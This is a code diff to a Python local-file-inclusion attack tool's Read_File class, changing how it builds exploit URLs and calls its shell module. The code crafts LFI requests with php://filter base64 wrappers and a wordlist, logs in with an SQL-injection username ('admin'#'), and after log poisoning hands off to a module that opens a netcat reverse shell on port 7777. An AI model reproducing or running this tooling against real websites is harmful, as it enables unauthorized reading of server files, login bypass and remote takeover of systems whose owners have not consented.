@@ -55,10 +55,7 @@ class Read_File:
                    print("[+] File Target         : ................ | : ", str(self.args.read))  
                 else:    
                    print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt") 
-            if self.args.Domain:
-                 print("[+] Vulnrenable url     : ................ | : "+str(self.args.Domain))
-            else:
-                print("[+] Vulnrenable url     : ................ | : "+str(self.args.Vulnurl))
+            print("[+] Vulnrenable url     : ................ | : "+str(self.args.Vulnurl))
             if self.args.base64:
                print("[+] PHP-Filter          : ................ | : Convert-base64") 
             print("[+] web Cookies         : ................ | : "+self.Cookie)  
@@ -157,16 +154,12 @@ class Read_File:
                 command_dir = readline.readlines()
                 for LINE in command_dir :
                     LINE.replace('\n','')
-                    self.LFi = ''s
+                    self.LFi = ''
                     if self.args.base64:
                         phpfillter = 'php://filter/read=convert.base64-encode/resource='
                         URL = self.args.Vulnurl+ phpfillter
-
-                    else:
-                         if self.args.Domain:
-                            URL = self.args.Domain
-                         else:
-                             URL = self.args.Vulnurl 
+                    else:    
+                        URL = self.args.Vulnurl 
                     if '//' in LINE and not 'file' in LINE:  
                         self.LFI =URL+LINE+self.args.read.replace('/','//')
                     elif '%2f' in LINE  :
@@ -174,8 +167,9 @@ class Read_File:
                     elif 'file:' in LINE :
                          self.LFI = URL+LINE+self.args.read.replace('/','',1)       
                     else:
-                        self.LFI = URL+LINE+self.args.read                                                                                               
+                        self.LFI = (URL+LINE+self.args.read).replace('\n','')                                                                                               
                     self.url = self.LFI
+                    print(self.url)
                     request = mechanize.Browser()
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
@@ -186,11 +180,8 @@ class Read_File:
                                  ('username',"admin'#"),
                                  ('password','password')]
                     try: 
-                       if self.args.Domain:
-                           self._first_req = request.open(self.args.Domain).read()
-                       else:           
-                           self._first_req = request.open(self.args.Vulnurl).read()                                                      
-                       self.Get_Oregnal_URL = request.open(self.url).read() 
+                      self._first_req = request.open(self.args.Vulnurl).read()                                                      
+                      self.Get_Oregnal_URL = request.open(self.url).read() 
                     except Exception  as e :
                          print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                          print("[*] Error : ",e )
@@ -239,7 +230,8 @@ class Read_File:
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                     print("[+] Lisliner IP          : ................ | :",self.ip_re)   
                                     print("[+] Lisliner Port        : ................ | : 7777") 
-                                    self.Reverse_shell()
+                                    from Package.LFT_Shell_connect  import Shell_conncet
+                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                     exit()
                                 else:
                                       print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
@@ -284,14 +276,16 @@ class Read_File:
                                          print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                          print("[+] Lisliner Port        : ................ | :",self.args.port) 
                                          print("[+] Lisliner IP          : ................ | : 0.0.0.0")
-                                         self.Reverse_shell()
+                                         from Package.LFT_Shell_connect import Shell_conncet
+                                         Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                          exit()
                                     else:
                                         print("[+] Mothead              : ................ | : enjaction log file  ")
                                         print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                         print("[+] Lisliner IP          : ................ | :",self.args.shell)   
                                         print("[+] Lisliner Port        : ................ | : 7777") 
-                                        self.Reverse_shell()
+                                        from Package.LFT_Shell_connect import Shell_conncet
+                                        Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                         exit()
                                 else:
                                       print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
@@ -320,15 +314,6 @@ class Read_File:
         except SyntaxError as a :
                print(a)
                exit()                                                                                             
-     def Reverse_shell(self,**kwargs):
-                 if not self.args.shell and not self.args.port :
-                    exit()
-                 else:   
-                   try:
-                     from Package.LFT_Shell_connect import Shell_conncet
-                     Shell_conncet.__init__(self)                     
-                   except KeyboardInterrupt :
-                      exit()
      def file_name (self,**kwargs):
         if not self.args.read :
           self.args.read = str("".join(re.findall('=.+',self.url)))\
